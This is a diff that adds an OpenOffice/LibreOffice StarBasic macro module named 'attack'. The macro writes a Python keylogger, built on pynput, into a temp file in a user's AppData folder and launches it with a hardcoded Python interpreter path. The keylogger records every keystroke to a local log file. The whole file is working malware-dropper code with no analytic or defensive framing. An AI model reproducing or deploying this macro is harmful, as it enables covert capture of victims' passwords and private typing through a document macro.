@@ -1,0 +1,47 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="attack" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****
+
+Sub Main
+
+	Dim oSFA As Object, oOutStream as Object, oOutText as Object
+	Dim sFilePath as String
+	
+	oSFA = createUNOService(&quot;com.sun.star.ucb.SimpleFileAccess&quot;)
+	sFilePath = &quot;C:\Users\lucas&quot; + &quot;\AppData\Local\Temp\attack.py&quot;
+	
+	If oSFA.exists(sFilePath) Then
+		oSFA.kill(sFilePath) 
+		End If
+	
+	oOutStream = oSFA.openFileWrite(sFilePath)
+	oOutText = createUNOService (&quot;com.sun.star.io.TextOutputStream&quot;)
+	oOutText.setOutputStream(oOutStream)
+	
+	oOutText.WriteString(&quot;from pynput.keyboard import Key&quot; + Chr(13) + Chr(10))
+	oOutText.WriteString(&quot;from pynput.keyboard import Listener&quot; + Chr(13) + Chr(10))
+	
+
+	oOutText.WriteString(&quot;the_keys = []&quot; + Chr(13) + Chr(10))
+	oOutText.WriteString(&quot;def functionPerKey(key):&quot; + Chr(13) + Chr(10))
+	oOutText.WriteString(&quot;    the_keys.append(key)&quot; + Chr(13) + Chr(10))
+    oOutText.WriteString(&quot;    storeKeysToFile(the_keys)&quot; + Chr(13) + Chr(10))
+    
+    oOutText.WriteString(&quot;def storeKeysToFile(keys):&quot; + Chr(13) + Chr(10))
+	oOutText.WriteString(&quot;    with open(&apos;keylog.txt&apos;,&apos;w&apos;) as log:&quot; + Chr(13) + Chr(10))
+    oOutText.WriteString(&quot;      for the_key in keys:&quot; + Chr(13) + Chr(10))
+    oOutText.WriteString(&quot;       the_key = str(the_key).replace(&quot;&quot;&apos;&quot;&quot;,&quot;&quot;&quot;&quot;)&quot; + Chr(13) + Chr(10))
+    oOutText.WriteString(&quot;       log.write(the_key)&quot; + Chr(13) + Chr(10)) 
+    
+    oOutText.WriteString(&quot;def onEachKeyRelease(the_key):&quot; + Chr(13) + Chr(10))
+	oOutText.WriteString(&quot;    if the_key == Key.esc:&quot; + Chr(13) + Chr(10))
+    oOutText.WriteString(&quot;      return False&quot; + Chr(13) + Chr(10))   
+    
+    oOutText.WriteString(&quot;with Listener(&quot; + Chr(13) + Chr(10))
+    oOutText.WriteString(&quot;  on_press = functionPerKey,&quot; + Chr(13) + Chr(10))
+    oOutText.WriteString(&quot;  on_release = onEachKeyRelease,&quot; + Chr(13) + Chr(10))
+    oOutText.WriteString(&quot;) as the_listener:&quot; + Chr(13) + Chr(10))
+    oOutText.WriteString(&quot;     the_listener.join()&quot; + Chr(13) + Chr(10))
+   Shell(&quot;C:\Users\lucas\AppData\Local\Programs\Python\Python311\python.exe &quot; + sFilePath)
+End Sub
+</script:module>
